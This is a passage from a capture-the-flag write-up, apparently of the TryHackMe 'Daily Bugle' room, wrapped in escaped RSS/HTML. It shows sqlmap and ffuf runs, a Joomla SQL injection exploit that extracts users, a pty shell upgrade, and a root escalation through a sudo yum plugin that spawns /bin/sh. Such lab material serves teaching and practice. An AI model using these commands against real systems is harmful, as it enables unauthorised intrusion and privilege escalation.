&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /bin/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /cache/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /cli/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /components/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /includes/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /installation/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /language/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /layouts/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /libraries/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /logs/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /modules/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /plugins/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Disallow: /tmp/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>This is the output.&lt;/p>
&lt;p>For now I am going to ignore it.&lt;/p>
&lt;p>Now I just started sqlmap with the request that I captured from the login form:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">└─$ sqlmap -r Desktop/response.txt --dbms&lt;span class="o">=&lt;/span>mariadb --dump --threads&lt;span class="o">=&lt;/span>&lt;span class="m">5&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And then I ran ffuf for directory enumeration:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;span class="lnt">31
&lt;/span>&lt;span class="lnt">32
&lt;/span>&lt;span class="lnt">33
&lt;/span>&lt;span class="lnt">34
&lt;/span>&lt;span class="lnt">35
&lt;/span>&lt;span class="lnt">36
&lt;/span>&lt;span class="lnt">37
&lt;/span>&lt;span class="lnt">38
&lt;/span>&lt;span class="lnt">39
&lt;/span>&lt;span class="lnt">40
&lt;/span>&lt;span class="lnt">41
&lt;/span>&lt;span class="lnt">42
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">ffuf -u http://10.10.62.253/FUZZ -w /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s1">&amp;#39;___\ /&amp;#39;&lt;/span>___&lt;span class="se">\ &lt;/span> /&lt;span class="err">&amp;#39;&lt;/span>___&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> /&lt;span class="se">\ \_&lt;/span>_/ /&lt;span class="se">\ \_&lt;/span>_/ __ __ /&lt;span class="se">\ \_&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \ &lt;/span>,__&lt;span class="se">\\&lt;/span> &lt;span class="se">\ &lt;/span>,__&lt;span class="se">\/\ \/\ \ \ \ &lt;/span>,__&lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\ \ \_&lt;/span>/ &lt;span class="se">\ \ \_&lt;/span>/&lt;span class="se">\ \ \_\ \ \ \ \_&lt;/span>/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_\ &lt;/span> &lt;span class="se">\ \_&lt;/span>___/ &lt;span class="se">\ \_\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>_/ &lt;span class="se">\/&lt;/span>___/ &lt;span class="se">\/&lt;/span>_/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> v2.1.0-dev
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Method : GET
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: URL : http://10.10.62.253/FUZZ
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Follow redirects : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Calibration : &lt;span class="nb">false&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Timeout : &lt;span class="m">10&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Threads : &lt;span class="m">40&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">________________________________________________
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htpasswd &lt;span class="o">[&lt;/span>Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 5237ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">.htaccess &lt;span class="o">[&lt;/span>Status: 403, Size: 211, Words: 15, Lines: 9, Duration: 5361ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">administrator &lt;span class="o">[&lt;/span>Status: 301, Size: 242, Words: 14, Lines: 8, Duration: 80ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin &lt;span class="o">[&lt;/span>Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 79ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cache &lt;span class="o">[&lt;/span>Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 80ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cgi-bin/ &lt;span class="o">[&lt;/span>Status: 403, Size: 210, Words: 15, Lines: 9, Duration: 80ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cli &lt;span class="o">[&lt;/span>Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 82ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">components &lt;span class="o">[&lt;/span>Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 94ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">images &lt;span class="o">[&lt;/span>Status: 301, Size: 235, Words: 14, Lines: 8, Duration: 76ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">includes &lt;span class="o">[&lt;/span>Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 79ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">language &lt;span class="o">[&lt;/span>Status: 301, Size: 237, Words: 14, Lines: 8, Duration: 80ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">layouts &lt;span class="o">[&lt;/span>Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 80ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">libraries &lt;span class="o">[&lt;/span>Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 77ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">media &lt;span class="o">[&lt;/span>Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 79ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">modules &lt;span class="o">[&lt;/span>Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 80ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">plugins &lt;span class="o">[&lt;/span>Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 79ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">robots.txt &lt;span class="o">[&lt;/span>Status: 200, Size: 836, Words: 88, Lines: 33, Duration: 80ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">templates &lt;span class="o">[&lt;/span>Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 71ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">tmp &lt;span class="o">[&lt;/span>Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 80ms&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">:: Progress: &lt;span class="o">[&lt;/span>20469/20469&lt;span class="o">]&lt;/span> :: Job &lt;span class="o">[&lt;/span>1/1&lt;span class="o">]&lt;/span> :: &lt;span class="m">265&lt;/span> req/sec :: Duration: &lt;span class="o">[&lt;/span>0:00:51&lt;span class="o">]&lt;/span> :: Errors: &lt;span class="m">0&lt;/span> ::
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>Ok, now that I have more informations, I can visit the administrator page:&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/Blueaulo/DailyBugle-writeup-THM/main/99236161-baab-4e1e-8659-b58dbee818de_Export-bd191e58-92d7-4a75-b58b-142788c8928f/Daily%20Bugle%20f7664d233b7c4054a261e00462332c48/Untitled%201.png"
loading="lazy"
alt="Untitled"
>&lt;/p>
&lt;p>Nice, we have the jomla login panel.&lt;/p>
&lt;p>Now we can run OWASP joomscan, and find the version.&lt;/p>
&lt;p>After that I searched for an exploit, and found this python script:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python3 joomblah.py http://10.10.62.253
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .---. .-&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;-. .-&amp;#39;&amp;#39;&amp;#39;&lt;/span>-.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="s1">&amp;#39; _ \ &amp;#39;&lt;/span> _ &lt;span class="se">\ &lt;/span> .---.
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;---&amp;#39;&lt;/span> / /&lt;span class="sb">`&lt;/span> &lt;span class="s1">&amp;#39;. \ / /` &amp;#39;&lt;/span>. &lt;span class="se">\ &lt;/span> __ __ ___ /&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> .
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .---.. &lt;span class="p">|&lt;/span> &lt;span class="se">\ &lt;/span> &lt;span class="s1">&amp;#39; . | \ &amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span>/ &lt;span class="sb">`&lt;/span>.&lt;span class="s1">&amp;#39; `. || | | .&amp;#39;&lt;/span>&lt;span class="p">|&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="s1">&amp;#39; | &amp;#39;&lt;/span>&lt;span class="p">|&lt;/span> &lt;span class="s1">&amp;#39; | &amp;#39;&lt;/span>&lt;span class="p">|&lt;/span> .-. .-. &lt;span class="s1">&amp;#39;|| | | &amp;lt; |
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | |\ \ / / \ \ / / | | | | | ||| __ | | __ | |
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | | `. ` ..&amp;#39;&lt;/span> / &lt;span class="sb">`&lt;/span>. &lt;span class="sb">`&lt;/span> ..&lt;span class="s1">&amp;#39; / | | | | | |||/&amp;#39;&lt;/span>__ &lt;span class="s1">&amp;#39;. | | .:--.&amp;#39;&lt;/span>. &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> .&lt;span class="s1">&amp;#39;&amp;#39;&amp;#39;-.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> | | &amp;#39;&lt;/span>-...-&lt;span class="s1">&amp;#39;` &amp;#39;&lt;/span>-...-&lt;span class="s1">&amp;#39;` | | | | | ||:/` &amp;#39;&lt;/span>. &lt;span class="s1">&amp;#39;| |/ | \ | | |/.&amp;#39;&amp;#39;&amp;#39;&lt;/span>. &lt;span class="se">\
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">||&lt;/span>&lt;span class="p">|&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="o">||&lt;/span> &lt;span class="p">|&lt;/span>&lt;span class="sb">`&lt;/span>&lt;span class="s2">&amp;#34; __ | | | / | |
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> | | |__| |__| |__|||\ / &amp;#39;| | .&amp;#39;.&amp;#39;&amp;#39;| | | | | |
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> __.&amp;#39; &amp;#39; |/&amp;#39;..&amp;#39; / &amp;#39;---&amp;#39;/ / | |_| | | |
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">| &amp;#39; &amp;#39; `&amp;#39;-&amp;#39;` \ \._,\ &amp;#39;/| &amp;#39;. | &amp;#39;.
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2">|____.&amp;#39; `--&amp;#39; `&amp;#34;&lt;/span> &lt;span class="s1">&amp;#39;---&amp;#39;&lt;/span> &lt;span class="s1">&amp;#39;---&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Fetching CSRF token
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>-&lt;span class="o">]&lt;/span> Testing SQLi
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - Found table: &amp;lt;redacted&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - Extracting users from &amp;lt;redacted&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">[&lt;/span>$&lt;span class="o">]&lt;/span> Found user &lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;&amp;lt;redacted&amp;gt;&amp;#39;&lt;/span>&lt;span class="o">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> - Extracting sessions from &amp;lt;redacted&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>After finding the hash of Jonah, I just went to hashidentifier and cracked it.&lt;/p>
&lt;p>Now for creating a reverse shell I found this Article online: &lt;a class="link" href="https://www.hackingarticles.in/joomla-reverse-shell/" target="_blank" rel="noopener"
>https://www.hackingarticles.in/joomla-reverse-shell/&lt;/a>&lt;/p>
&lt;p>I followed and I got a rev shell.&lt;/p>
&lt;p>I upgraded the shell using:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">python -c &lt;span class="s2">&amp;#34;import pty; pty.spawn(&amp;#39;/bin/bash&amp;#39;)&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And found the jjameson’s password inside linpeas.&lt;/p>
&lt;p>Now we need to become root.&lt;/p>
&lt;p>I used sudo -l to list all the privileges:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">sudo -l
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Matching Defaults entries &lt;span class="k">for&lt;/span> jjameson on dailybugle:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> env_reset, &lt;span class="nv">env_keep&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">env_keep&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="s2">&amp;#34;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">env_keep&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="s2">&amp;#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">env_keep&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="s2">&amp;#34;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">env_keep&lt;/span>&lt;span class="o">+=&lt;/span>&lt;span class="s2">&amp;#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">secure_path&lt;/span>&lt;span class="o">=&lt;/span>/sbin&lt;span class="se">\:&lt;/span>/bin&lt;span class="se">\:&lt;/span>/usr/sbin&lt;span class="se">\:&lt;/span>/usr/bin
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User jjameson may run the following commands on dailybugle:
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">(&lt;/span>ALL&lt;span class="o">)&lt;/span> NOPASSWD: /usr/bin/yum
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>And then went to gtfobins and used this for a root shell:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="nv">TF&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="k">$(&lt;/span>mktemp -d&lt;span class="k">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat &amp;gt;&lt;span class="nv">$TF&lt;/span>/x&lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">[main]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">plugins=1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">pluginpath=$TF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">pluginconfpath=$TF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat &amp;gt;&lt;span class="nv">$TF&lt;/span>/y.conf&lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">[main]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">enabled=1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cat &amp;gt;&lt;span class="nv">$TF&lt;/span>/y.py&lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">import os
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">import yum
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">requires_api_version=&amp;#39;2.1&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">def init_hook(conduit):
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> os.execl(&amp;#39;/bin/sh&amp;#39;,&amp;#39;/bin/sh&amp;#39;)
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sudo yum -c &lt;span class="nv">$TF&lt;/span>/x --enableplugin&lt;span class="o">=&lt;/span>y
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item></channel></rss>